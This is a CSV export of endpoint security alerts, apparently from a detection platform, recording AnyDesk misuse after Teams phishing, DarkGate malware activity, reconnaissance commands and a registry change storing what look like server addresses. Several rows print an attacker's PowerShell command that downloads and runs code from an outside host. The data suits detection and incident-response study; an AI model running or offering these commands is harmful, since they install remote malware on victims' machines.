AzureADUserId,MachineId,ProcessCommandLine,AlertId,FileName,AlertTitle,Severity,AttackerTenant
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,svchost.exe -k netsvcs -p -s Winmgmt,da51b792e0-a2ca-48d4-998b-d2dcbaf0b6e3_1,svchost.exe,Suspicious discovery indicative of Virtualization/Sandbox Evasion,Low,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,"""AnyDesk.exe"" --local-control",da7ef9aaed-e5a0-4211-b0fa-578a9079e8d0_1,AnyDesk.exe,Suspicious System Hardware Discovery,Low,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,svchost.exe -k netsvcs -p -s Winmgmt,da7ef9aaed-e5a0-4211-b0fa-578a9079e8d0_1,svchost.exe,Suspicious System Hardware Discovery,Low,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,"""chrome.exe"" --type=gpu-process --string-annotations=is-enterprise-managed=yes --no-pre-read-main-dll --gpu-preferences=UAAAAAAAAADgAAAEAAAAAAAAAAAAAAAAAABgAAEAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --field-trial-handle=2544,i,5504156731435484193,11103767542710730167,262144 --variations-seed-version=20241219-130728.147000 --mojo-platform-channel-handle=2528 /prefetch:2",da5cc5f1d8-8bcf-457b-b4f8-1ce11f2e623f_1,chrome.exe,A process was launched on a hidden desktop,Medium,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,"""chrome.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\UserPII_656cba301cda4ac67b3ad9006840b0b1b03a0bcd\AppData\Local\Google\Chrome\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\UserPII_656cba301cda4ac67b3ad9006840b0b1b03a0bcd\AppData\Local\Google\Chrome\User Data\Crashpad"" --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=131.0.6778.140 --initial-client-data=0x224,0x228,0x22c,0x220,0x230,0x7ffb39f3fd08,0x7ffb39f3fd14,0x7ffb39f3fd20",da5cc5f1d8-8bcf-457b-b4f8-1ce11f2e623f_1,chrome.exe,A process was launched on a hidden desktop,Medium,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,cmd.exe /c systeminfo,da960d3a4d-6f28-4671-9a84-0a2cf09df872_1,cmd.exe,Suspicious process launch by Rundll32.exe,Medium,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,"rundll32.exe  SmartService.dll,Uninit",da960d3a4d-6f28-4671-9a84-0a2cf09df872_1,rundll32.exe,Suspicious process launch by Rundll32.exe,Medium,1a34c532-7345-4b36-b041-57f22209d8d1
0669c0e7-54d2-4ff6-808e-3613ce9e42db,d02d4dc4a1733254bcd07135bdf053d7b29f7fef,"""chrome.exe"" --remote-debugging-port=9222 --profile-directory=""Default""",da5cc5f1d8-8bcf-457b-b4f8-1ce11f2e623f_1,chrome.exe,A process was launched on a hidden desktop,Medium,1a34c532-7345-4b36-b041-57f22209d8d1
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSync.dll,SetMaxLogLevel",da3ae641b3-779b-4c70-9784-466b6312d3fa_1,rundll32.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",da3ae641b3-779b-4c70-9784-466b6312d3fa_1,cmd.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da3ae641b3-779b-4c70-9784-466b6312d3fa_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --backend",da8bbd50a2-dbbd-4d12-9a4b-b8bf9fff58f1_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSync.dll,SetMaxLogLevel",da8bbd50a2-dbbd-4d12-9a4b-b8bf9fff58f1_1,rundll32.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-service",da8bbd50a2-dbbd-4d12-9a4b-b8bf9fff58f1_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",da8bbd50a2-dbbd-4d12-9a4b-b8bf9fff58f1_1,cmd.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da8bbd50a2-dbbd-4d12-9a4b-b8bf9fff58f1_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --backend",da62d3b4af-67a3-4ff9-b589-b099af9fa7dd_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSync.dll,SetMaxLogLevel",da62d3b4af-67a3-4ff9-b589-b099af9fa7dd_1,rundll32.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-service",da62d3b4af-67a3-4ff9-b589-b099af9fa7dd_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",da62d3b4af-67a3-4ff9-b589-b099af9fa7dd_1,cmd.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da62d3b4af-67a3-4ff9-b589-b099af9fa7dd_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --backend",da3487c150-05a0-484d-af26-1cca0e8ae68e_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSync.dll,SetMaxLogLevel",da3487c150-05a0-484d-af26-1cca0e8ae68e_1,rundll32.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-service",da3487c150-05a0-484d-af26-1cca0e8ae68e_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",da3487c150-05a0-484d-af26-1cca0e8ae68e_1,cmd.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da3487c150-05a0-484d-af26-1cca0e8ae68e_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ProtectedHost.dll,SetMaxLogLevel",dab76ebbd6-eb00-40af-8800-b2e1c1753d5a_1,rundll32.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ProtectedHost.dll,SetMaxLogLevel",dabd1b1b83-cb8f-4a4f-8921-156c18e28bba_1,rundll32.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ProtectedHost.dll,SetMaxLogLevel",daf88c2b0d-fbda-4616-904f-09ebe18f7ad9_1,rundll32.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ProtectedHost.dll,SetMaxLogLevel",dac31f6380-b805-49a4-a008-e2c4b2f93501_1,rundll32.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",dac31f6380-b805-49a4-a008-e2c4b2f93501_1,cmd.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",dac31f6380-b805-49a4-a008-e2c4b2f93501_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --backend",dabd1b1b83-cb8f-4a4f-8921-156c18e28bba_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSrv.dll,DllCanUnloadNow",dabd1b1b83-cb8f-4a4f-8921-156c18e28bba_1,rundll32.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-service",dabd1b1b83-cb8f-4a4f-8921-156c18e28bba_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",dabd1b1b83-cb8f-4a4f-8921-156c18e28bba_1,cmd.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",dabd1b1b83-cb8f-4a4f-8921-156c18e28bba_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --backend",dab76ebbd6-eb00-40af-8800-b2e1c1753d5a_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSrv.dll,DllCanUnloadNow",dab76ebbd6-eb00-40af-8800-b2e1c1753d5a_1,rundll32.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-service",dab76ebbd6-eb00-40af-8800-b2e1c1753d5a_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",dab76ebbd6-eb00-40af-8800-b2e1c1753d5a_1,cmd.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",dab76ebbd6-eb00-40af-8800-b2e1c1753d5a_1,AnyDesk.exe,Compromised account conducting hands-on-keyboard attack,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --backend",daf88c2b0d-fbda-4616-904f-09ebe18f7ad9_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSrv.dll,DllCanUnloadNow",daf88c2b0d-fbda-4616-904f-09ebe18f7ad9_1,rundll32.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-service",daf88c2b0d-fbda-4616-904f-09ebe18f7ad9_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",daf88c2b0d-fbda-4616-904f-09ebe18f7ad9_1,cmd.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",daf88c2b0d-fbda-4616-904f-09ebe18f7ad9_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da0efcbe1e-78c9-4cc5-851f-1969e49d1fd5_1,AnyDesk.exe,Suspicious sequence of exploration activities,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,svchost.exe -k netsvcs -p -s Winmgmt,da0efcbe1e-78c9-4cc5-851f-1969e49d1fd5_1,svchost.exe,Suspicious sequence of exploration activities,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"rundll32.exe  ActiveSrv.dll,DllCanUnloadNow",da9e983884-2b0f-4459-86c1-b6e0824ccdc3_1,rundll32.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" ",da9e983884-2b0f-4459-86c1-b6e0824ccdc3_1,cmd.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da9e983884-2b0f-4459-86c1-b6e0824ccdc3_1,AnyDesk.exe,Remote monitoring and management software suspicious activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""cmd.exe"" /c wmic ComputerSystem get domain > C:\ProgramData\ahkfbcf\cbhkadc",da373e7636-2bf2-4706-ba86-cd62d95abd65_1,cmd.exe,Possible DarkGate activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""Autoit3.exe"" c:\temp\test\script.a3x",da373e7636-2bf2-4706-ba86-cd62d95abd65_1,Autoit3.exe,Possible DarkGate activity,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da07d00fd7-67f7-400b-a864-d17d3659cbef_1,AnyDesk.exe,Suspicious System Hardware Discovery,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,svchost.exe -k netsvcs -p -s Winmgmt,da07d00fd7-67f7-400b-a864-d17d3659cbef_1,svchost.exe,Suspicious System Hardware Discovery,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""FortiCert.exe"" ",da8ba5dbc2-f444-4178-8f12-a68530ae0b89_1,FortiCert.exe,'Bearfoos' malware was blocked and was active,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""FortiCert.exe"" ",da6ef4973e-cc57-446a-8710-492accec68f6_1,FortiCert.exe,An active 'Bearfoos' malware was blocked,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" ",da638699614066775472_563436914,AnyDesk.exe,Suspicious remote management tool use in Teams phishing attempts,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""msedge.exe"" --no-startup-window --win-session-start --flag-switches-begin --flag-switches-end",da638699614066775472_563436914,msedge.exe,Suspicious remote management tool use in Teams phishing attempts,High,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",dac7bca2c5-5a25-4327-babc-439a2a09055f_1,AnyDesk.exe,Suspicious System Hardware Discovery,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,svchost.exe -k netsvcs -p -s Winmgmt,dac7bca2c5-5a25-4327-babc-439a2a09055f_1,svchost.exe,Suspicious System Hardware Discovery,Low,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da638699775950284150_1013209008,anydesk.exe,Endpoint attack notifications: Suspicious DLL drop and execution by RMM tool,Medium,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,ipconfig  /all,da638699775950994599_-979079827,ipconfig.exe,Endpoint attack notifications: Created Process,Medium,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,"""AnyDesk.exe"" --local-control",da638699775950372417_-1247210682,anydesk.exe,Endpoint attack notifications: File Creation,Medium,de9bcee7-1e9c-4878-9fb7-39b9116e9964
cece0535-0f8f-4001-a4e6-603ac3cc7ce8,c9ce7e07aabd890ce894c36d71dad1455127e0b4,whoami  /all,da638699775950035007_268409303,whoami.exe,Endpoint attack notifications: Created Process,Medium,de9bcee7-1e9c-4878-9fb7-39b9116e9964
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,cscript  5.vbs,dac6121039-16b6-4dcd-919c-888a1c49a119_1,cscript.exe,An active 'DarkGate' malware in a VBS script was prevented from executing via AMSI,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""AnyDesk.exe"" ",da638695960211105076_-1790185128,AnyDesk.exe,Suspicious remote management tool use in Teams phishing attempts,High,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""msedge.exe"" --no-startup-window",da638695960211105076_-1790185128,msedge.exe,Suspicious remote management tool use in Teams phishing attempts,High,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""WScript.exe"" ""C:\Users\UserPII_0dfe6c2af63d4c20679fd89f777e216a8d0b4a3d\FilePII_5ceb804e9e465259e860c8e0beb8c9bb4e40cbeb.vbs"" ",da172065fe-e029-4896-820c-820d3c63a5ff_1,wscript.exe,Suspicious script launched,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""powershell.exe"" -Command Invoke-Expression (Invoke-RestMethod -Uri http://aspava-yachting.com:8080/bsagbuzq)",da172065fe-e029-4896-820c-820d3c63a5ff_1,powershell.exe,Suspicious script launched,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,cscript  FilePII_5ceb804e9e465259e860c8e0beb8c9bb4e40cbeb.vbs,da172065fe-e029-4896-820c-820d3c63a5ff_1,cscript.exe,Suspicious script launched,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""WScript.exe"" ""C:\Users\UserPII_0dfe6c2af63d4c20679fd89f777e216a8d0b4a3d\FilePII_ecaa0b34971f0f01b8ffd695e950adbb59f55307.vbs"" ",da172065fe-e029-4896-820c-820d3c63a5ff_1,wscript.exe,Suspicious script launched,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --string-annotations=is-enterprise-managed=yes --field-trial-handle=2648,i,10570542443503963118,13274640200020366116,262144 --variations-seed-version --mojo-platform-channel-handle=2864 /prefetch:3",dadf679dd7-d2d1-4a5a-8f36-cfebda273245_1,msedge.exe,Suspicious activity linked to an access broker detected,High,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""AnyDesk.exe"" --local-control",daef48aeaa-2489-404e-b692-3d73bafcf671_1,AnyDesk.exe,Suspicious System Hardware Discovery,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,svchost.exe -k netsvcs -p -s Winmgmt,daef48aeaa-2489-404e-b692-3d73bafcf671_1,svchost.exe,Suspicious System Hardware Discovery,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,"""powershell.exe"" -Command Invoke-Expression (Invoke-RestMethod -Uri http://aspava-yachting.com:8080/aatdrwmc)",da172065fe-e029-4896-820c-820d3c63a5ff_1,powershell.exe,Suspicious script launched,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
757cb475-2a74-4ee9-a162-aba546683ea5,8011966abd9dfc4ea1019d71ae8c65ecadd1f705,cscript  FilePII_ecaa0b34971f0f01b8ffd695e950adbb59f55307.vbs,da172065fe-e029-4896-820c-820d3c63a5ff_1,cscript.exe,Suspicious script launched,Low,135f3a0d-e454-4d80-95d9-62d310e92e2a
0452d27f-e096-4b8e-b7bc-3bf8efa17685,2710f37c13b0dc31538c74bbde890c71dc8212dd,"reg  add ""HKCU\SOFTWARE\TitanPlus"" /v 1 /t REG_SZ /d ""Ipv4PII_f66d3c6153dca639d3bc89a5de44f0e558643771:443;Ipv4PII_b20d3fbc8c9602cafe9410c3c934f2f5279ea7b5:443;Ipv4PII_a5c9cb52f2dc0963b77ce0967f17b9fc71ab6706:443"" /f ",dab0d99b6f-68eb-464d-b8dc-d71b52deced9_1,reg.exe,Suspicious registry modification,Low,2d7d3603-91e3-4d36-8d2b-0c0d9cd76424
